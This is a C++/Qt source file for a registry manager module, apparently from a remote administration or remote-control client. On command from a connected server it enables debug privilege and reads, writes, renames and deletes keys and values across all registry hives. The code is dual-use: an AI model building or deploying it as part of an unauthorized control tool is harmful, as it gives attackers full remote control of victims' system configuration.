#include "registrymanager.h"

RegistryManager::RegistryManager(TcpClient *TClient, QObject *parent) : AbsManager(TClient)
{
    qDebug()<<"a Registry Manager is created.";
    connect(m_client, &TcpClient::connected,this,[=](){
        emit logMessage("[RegistryManager] 客户端已与服务器连接");
        qDebug()<<"[RegistryManager] 客户端已与服务器连接";
        EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
        m_client->SendReply(REGISTRY_REPLY);

    });
}

RegistryManager::~RegistryManager()
{
    EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

void RegistryManager::HandlePacket(const PACKET &pkt)
{
    qDebug()<<"Registry manager handeling";
    auto Token = pkt.isToken;
    switch(Token)
    {
    case REGISTRY_SEARCH_REQUIRE:{
        QDataStream stream(pkt.payload);
        quint8 root; QString subPath;
        stream >>root>>subPath;
        FindRegistryData(static_cast<MREG_KEY>(root),subPath,true);
        break;
    }
    case REGISTRY_REFRESH_VALUE_REQUIRE:
    {
        QDataStream stream(pkt.payload);
        quint8 root; QString subPath;
        stream >>root>>subPath;
        FindRegistryData(static_cast<MREG_KEY>(root),subPath,false);
        break;
    }
    case REGISTRY_VALUE_MODIFY:
    {
        QDataStream stream(pkt.payload);
        quint8 root;
        QString subPath, valueName;
        quint32 type;
        QByteArray newData;
        stream >> root >> subPath >> valueName >> type >> newData;
        qDebug()<<root<<subPath<<valueName<<type<<newData;
        ModifyValue(root,subPath,valueName,(MREG_VALUE)type,newData);
        break;
    }
    case REGISTRY_VALUE_DELETE:
    {
        QDataStream stream(pkt.payload);
        quint8 root;
        QString subPath, valueName;
        stream >> root >> subPath >> valueName;
        DeleteValue(root, subPath, valueName);
        break;
    }
    case REGISTRY_VALUE_RENAME:
    {
        QDataStream stream(pkt.payload);
        quint8 root;
        QString subPath, oldName, newName;
        stream >> root >> subPath >> oldName >> newName;
        RenameValue(root, subPath, oldName, newName);
        break;
    }
    case REGISTRY_VALUE_NEW:
    {
        QDataStream stream(pkt.payload);
        quint8 root;
        QString subPath, name;
        quint32 type;
        QByteArray data;
        stream >> root >> subPath >> name >> type >> data;

        CreateValue(root, subPath, name, (MREG_VALUE)type, data);
        break;
    }
    case REGISTRY_KEY_NEW:
    {
        QDataStream stream(pkt.payload);
        quint8 root;
        QString parentPath, keyName;
        stream >> root >> parentPath >> keyName;

        CreateKey(root, parentPath, keyName);

        break;
    }
    case REGISTRY_KEY_RENAME:
    {
        QDataStream stream(pkt.payload);
        quint8 root;
        QString subPath, oldName, newName;
        stream >> root >> subPath >> oldName >> newName;
        RenameKey(root, subPath, oldName, newName);
        break;
    }
    case REGISTRY_KEY_DELETE:
    {
        QDataStream stream(pkt.payload);
        quint8 root;
        QString parentPath, keyName;
        stream >> root >> parentPath >> keyName;
        DeleteKey(root,parentPath,keyName);
        break;
    }
    default:
        qDebug()<<"[registry]unknown istoken"<<Token;
        break;
    }
}

QByteArray RegistryManager::FindPath(HKEY rootKey, const QString &subPath)
{
    QByteArray BufferData;
    HKEY KeyHandle;
    if (RegOpenKeyExW(rootKey, reinterpret_cast<LPCWSTR>(subPath.utf16()),
                      0, KEY_ALL_ACCESS, &KeyHandle) != ERROR_SUCCESS)
    {
        qDebug() << "[registry] open key failed:" << subPath;
        return {};
    }


    DWORD KeyCount = 0, KeyMaxLength = 0, MaxDataLength = 0;
    if(RegQueryInfoKeyW(KeyHandle, NULL, NULL, NULL,
                    &KeyCount, &KeyMaxLength, NULL,
                    NULL, NULL, &MaxDataLength, NULL, NULL) != ERROR_SUCCESS)
    {
        qDebug()<<"[registry] query key info failed";
        RegCloseKey(KeyHandle);
        return {};
    }
    if(KeyCount ==0)
    {
        RegCloseKey(KeyHandle);
        qDebug()<<"[registry] keycount is 0";
        return {};
    }

    QDataStream stream(&BufferData,QIODevice::WriteOnly);
    PACKET_HEADER header;
    header.count = KeyCount;
    header.nameSize = KeyMaxLength + 1;
    header.dataSize = 0;
    stream << header.count << (quint32)header.nameSize << (quint32) header.dataSize;

    for(DWORD i=0; i<KeyCount ;i++)
    {
        std::wstring name(KeyMaxLength+1, L'\0');
        DWORD len = KeyMaxLength + 1;
        if (RegEnumKeyExW(KeyHandle, i, name.data(), &len,
            nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
        {
            QString keyName = QString::fromStdWString(name.c_str());
            stream << keyName;
        }
        else
        {
            stream << QString();
        }
    }

    RegCloseKey(KeyHandle);
    return BufferData;
}

QByteArray RegistryManager::FindValue(HKEY rootKey, const QString &subPath)
{
    QByteArray BufferData;
    HKEY KeyHandle;
    if (RegOpenKeyExW(rootKey, reinterpret_cast<LPCWSTR>(subPath.utf16()),
                      0, KEY_ALL_ACCESS, &KeyHandle) != ERROR_SUCCESS)
    {
        qDebug() << "[registry] open key failed:" << subPath;
        return {};
    }


    DWORD ValueCount = 0, NameMaxLength = 0, MaxDataLength = 0;
    if (RegQueryInfoKeyW(KeyHandle, nullptr, nullptr, nullptr,
                         nullptr, nullptr, nullptr,
                         &ValueCount, &NameMaxLength,
                         &MaxDataLength, nullptr, nullptr) != ERROR_SUCCESS)
    {
        qDebug()<<"[registry] query key info failed";
        RegCloseKey(KeyHandle);
        return {};
    }
    if(ValueCount ==0)
    {
        RegCloseKey(KeyHandle);
        qDebug()<<"[registry] value count is 0";
        return {};
    }

    QDataStream stream(&BufferData,QIODevice::WriteOnly);
    PACKET_HEADER header;
    header.count = ValueCount;
    header.nameSize = NameMaxLength + 1;
    header.dataSize = MaxDataLength;
    stream << header.count << (quint32)header.nameSize << (quint32) header.dataSize;

    for(DWORD i=0; i<ValueCount ;i++)
    {
        std::wstring name(NameMaxLength + 1, L'\0');
        DWORD nameLen = NameMaxLength + 1;
        DWORD type = 0;
        QByteArray data(MaxDataLength,0);
        DWORD datalen = MaxDataLength;
        if (RegEnumValueW(KeyHandle, i, name.data(), &nameLen,
                          nullptr, &type, reinterpret_cast<LPBYTE>(data.data()), &datalen) == ERROR_SUCCESS)
        {
            QString ValueName = QString::fromStdWString(name.c_str());
            QByteArray realData = data.left(datalen);
            stream << MapRegType(type) << ValueName << realData;
        }
        else
        {
            stream << (quint32)MREG_UNKNOWN_TYPE << QString() << QByteArray();
        }
    }

    RegCloseKey(KeyHandle);
    return BufferData;
}

void RegistryManager::FindRegistryData(quint8 rootId, const QString &subPath, bool isFindPath)
{
    HKEY HRoot = MapKey(rootId);
    if (!HRoot)
    {
        qDebug()<<"[registry]invalid rootID"<<rootId;
        return;
    }
    if(isFindPath)
    {
        QByteArray PathData = FindPath(HRoot,subPath);
        if(!PathData.isEmpty())
        {
            PACKET pkt;
            pkt.isToken = REGISTRY_SEARCH_PATH_REPLY;
            pkt.payload = PathData;
            m_client->SendData(pkt);
        }
    }
    QByteArray ValueData = FindValue(HRoot,subPath);
    if(!ValueData.isEmpty())
    {
        PACKET pkt;
        pkt.isToken = REGISTRY_SEARCH_KEY_REPLY;
        pkt.payload = ValueData;
        m_client->SendData(pkt);
    }
}

void RegistryManager::ModifyValue(quint8 rootId, const QString &subPath, const QString &valueName, MREG_VALUE type, const QByteArray &data)
{
    HKEY HRoot = MapKey(rootId);
    HKEY KeyHandle;
    if (RegOpenKeyExW(HRoot, (LPCWSTR)subPath.utf16(), 0, KEY_SET_VALUE, &KeyHandle) != ERROR_SUCCESS) {
        qDebug() << "Open key failed";
        return;
    }

    DWORD ntype;
    switch (type) {
    case MREG_SZ:        ntype = REG_SZ; break;
    case MREG_EXPAND_SZ: ntype = REG_EXPAND_SZ; break;
    case MREG_DWORD:     ntype = REG_DWORD; break;
    case MREG_QWORD:     ntype = REG_QWORD; break;
    case MREG_BINARY:    ntype = REG_BINARY; break;
    case MREG_MULTI_SZ:  ntype = REG_MULTI_SZ; break;
    default:             ntype = REG_NONE; break;
    }

    if (RegSetValueExW(KeyHandle, (LPCWSTR)valueName.utf16(), 0, ntype,
                       reinterpret_cast<const BYTE*>(data.constData()), data.size()) != ERROR_SUCCESS) {
        qDebug() << "Set value failed";
    }
    else
    {
        qDebug()<< "Set value success";
    }

    RegCloseKey(KeyHandle);
    FindRegistryData(static_cast<MREG_KEY>(rootId),subPath,false);
}

void RegistryManager::DeleteValue(quint8 rootId, const QString &subPath, const QString &valueName)
{
    HKEY HRoot = MapKey(rootId);
    HKEY KeyHandle;
    if (RegOpenKeyExW(HRoot, (LPCWSTR)subPath.utf16(), 0, KEY_SET_VALUE, &KeyHandle) != ERROR_SUCCESS) {
        qDebug() << "Open key failed";
        return;
    }

    auto result = RegDeleteValueW(KeyHandle, valueName.isEmpty() ? nullptr : (LPCWSTR)valueName.utf16());
    if (result == ERROR_SUCCESS)
        qDebug() << "[Registry] Value deleted successfully";
    else
        qDebug() << "[Registry] Failed to delete value, error:" << result;

    RegCloseKey(KeyHandle);
    FindRegistryData(static_cast<MREG_KEY>(rootId),subPath,false);

}

void RegistryManager::DeleteKey(quint8 rootId, const QString &subPath, const QString &KeyName)
{
    HKEY hRoot = MapKey(rootId);
    if (!hRoot) {
        qDebug() << "[registry] Invalid root key:" << rootId;
        return;
    }

    // 打开父节点
    HKEY hParentKey;
    if (RegOpenKeyExW(hRoot, (LPCWSTR)subPath.utf16(),
                      0, KEY_WRITE, &hParentKey) != ERROR_SUCCESS)
    {
        qDebug() << "Open parent key failed";
        return;
    }

    // 执行删除
    LSTATUS status = RegDeleteTreeW(hParentKey, (LPCWSTR)KeyName.utf16());
    RegCloseKey(hParentKey);

    if (status != ERROR_SUCCESS)
    {
        qDebug() << "RegDeleteTree failed:" << status;
        return;
    }

    qDebug() << "[Registry] key deleted:" << KeyName;

    // 回执，通知客户端更新 UI
    PACKET pkt;
    pkt.isToken = REGISTRY_KEY_DELETE;
    QDataStream out(&pkt.payload, QIODevice::WriteOnly);
    out << rootId << subPath << KeyName;

    m_client->SendData(pkt);
}

void RegistryManager::RenameValue(quint8 rootId, const QString &subPath, const QString &oldName, const QString &newName)
{
    HKEY HRoot = MapKey(rootId);
    if (!HRoot) return;

    HKEY KeyHandle;
    if (RegOpenKeyExW(HRoot, (LPCWSTR)subPath.utf16(), 0, KEY_READ | KEY_SET_VALUE, &KeyHandle) != ERROR_SUCCESS) {
        qDebug() << "[Registry] Open key failed for rename";
        return;
    }

    DWORD type = 0;
    DWORD dataSize = 0;
    if (RegQueryValueExW(KeyHandle, (LPCWSTR)oldName.utf16(), nullptr, &type, nullptr, &dataSize) != ERROR_SUCCESS) {
        qDebug() << "[Registry] Failed to query old value";
        RegCloseKey(KeyHandle);
        return;
    }

    QByteArray data;
    data.resize(dataSize);
    if (RegQueryValueExW(KeyHandle, (LPCWSTR)oldName.utf16(), nullptr, &type,
                         reinterpret_cast<BYTE*>(data.data()), &dataSize) != ERROR_SUCCESS) {
        qDebug() << "[Registry] Failed to read old value data";
        RegCloseKey(KeyHandle);
        return;
    }

    // 写入新值
    if (RegSetValueExW(KeyHandle, (LPCWSTR)newName.utf16(), 0, type,
                       reinterpret_cast<const BYTE*>(data.constData()), dataSize) != ERROR_SUCCESS) {
        qDebug() << "[Registry] Failed to write new value";
        RegCloseKey(KeyHandle);
        return;
    }

    // 删除旧值
    RegDeleteValueW(KeyHandle, (LPCWSTR)oldName.utf16());
    RegCloseKey(KeyHandle);

    qDebug() << "[Registry] Value renamed from" << oldName << "to" << newName;

    FindRegistryData(static_cast<MREG_KEY>(rootId), subPath, false);
}

void RegistryManager::RenameKey(quint8 rootId, const QString &subPath, const QString &oldName, const QString &newName)
{
    HKEY hRoot = MapKey(rootId);

    // 打开父项，例如 SOFTWARE
    HKEY hParentKey;
    if (RegOpenKeyExW(hRoot, (LPCWSTR)subPath.utf16(),
                      0, KEY_WRITE, &hParentKey) != ERROR_SUCCESS)
    {
        qDebug() << "Open parent key failed";
        return;
    }

    // 执行重命名（注意！这个api只能在windows 10 1607以上版本生效！）
    LSTATUS status = RegRenameKey(
        hParentKey,
        (LPCWSTR)oldName.utf16(),
        (LPCWSTR)newName.utf16()
        );

    RegCloseKey(hParentKey);

    if (status != ERROR_SUCCESS)
    {
        qDebug() << "RegRenameKey failed:" << status;
        return;
    }
    else qDebug() << "rename key success!";

    // 发送成功回执给客户端
    PACKET pkt;
    pkt.isToken = REGISTRY_KEY_RENAME;
    QDataStream out(&pkt.payload, QIODevice::WriteOnly);
    out << rootId << subPath << oldName << newName;

    m_client->SendData(pkt);


}

void RegistryManager::CreateKey(quint8 rootId, const QString &subPath, const QString &KeyName)
{
    qDebug()<<rootId<<subPath<<KeyName;
    HKEY hRoot = MapKey(rootId);
    HKEY hParent;
    HKEY hNewKey;

    // 打开父路径
    if (RegOpenKeyExW(hRoot, (LPCWSTR)subPath.utf16(), 0, KEY_CREATE_SUB_KEY, &hParent) != ERROR_SUCCESS) {
        qDebug() << "[Registry] Open parent key failed:" << subPath;
        return;
    }

    // 创建新子项
    DWORD disposition;
    LONG result = RegCreateKeyExW(
        hParent,
        (LPCWSTR)KeyName.utf16(),
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hNewKey,
        &disposition
        );

    if (result == ERROR_SUCCESS) {
        qDebug() << "[Registry] Subkey created:" << KeyName;
        RegCloseKey(hNewKey);
    } else {
        qDebug() << "[Registry] Failed to create subkey:" << KeyName << "Error:" << result;
        return;
    }

    PACKET pkt;
    pkt.isToken = REGISTRY_KEY_NEW;
    QDataStream out(&pkt.payload, QIODevice::WriteOnly);
    out << rootId << subPath << KeyName;
    m_client->SendData(pkt);
}

void RegistryManager::CreateValue(quint8 rootId, const QString &subPath, const QString &valueName, MREG_VALUE type, const QByteArray &data)
{
    HKEY HRoot = MapKey(rootId);
    if (!HRoot) return;
    HKEY HKey;

    if (RegOpenKeyExW(HRoot, (LPCWSTR)subPath.utf16(), 0, KEY_SET_VALUE, &HKey) != ERROR_SUCCESS) {
        qDebug() << "Open key failed";
        return;
    }
    DWORD ntype;
    switch (type) {
    case MREG_SZ:        ntype = REG_SZ; break;
    case MREG_EXPAND_SZ: ntype = REG_EXPAND_SZ; break;
    case MREG_DWORD:     ntype = REG_DWORD; break;
    case MREG_QWORD:     ntype = REG_QWORD; break;
    case MREG_BINARY:    ntype = REG_BINARY; break;
    case MREG_MULTI_SZ:  ntype = REG_MULTI_SZ; break;
    default:             ntype = REG_NONE; break;
    }

    if (RegSetValueExW(HKey, (LPCWSTR)valueName.utf16(), 0, ntype,
                       reinterpret_cast<const BYTE*>(data.constData()), data.size()) == ERROR_SUCCESS) {
        qDebug() << "[Registry] Value created:" << valueName;
    } else {
        qDebug() << "[Registry] Failed to create value:" << valueName;
    }

    RegCloseKey(HKey);


    FindRegistryData(static_cast<MREG_KEY>(rootId), subPath, false);

}


HKEY RegistryManager::MapKey(unsigned char isToken)
{
    switch(isToken)
    {
    case MHKEY_CLASSES_ROOT: return HKEY_CLASSES_ROOT;
    case MHKEY_CURRENT_USER: return HKEY_CURRENT_USER;
    case MHKEY_LOCAL_MACHINE: return HKEY_LOCAL_MACHINE;
    case MHKEY_USERS: return HKEY_USERS;
    case MHKEY_CURRENT_CONFIG: return HKEY_CURRENT_CONFIG;
    default: return NULL;
    }
}

MREG_VALUE RegistryManager::MapRegType(DWORD type)
{
    switch(type)
    {
    case REG_SZ: return MREG_SZ;
    case REG_DWORD: return MREG_DWORD;
    case REG_QWORD: return MREG_QWORD;
    case REG_BINARY: return MREG_BINARY;
    case REG_MULTI_SZ: return MREG_MULTI_SZ;
    case REG_EXPAND_SZ: return MREG_EXPAND_SZ;
    default: return MREG_UNKNOWN_TYPE;
    }
}
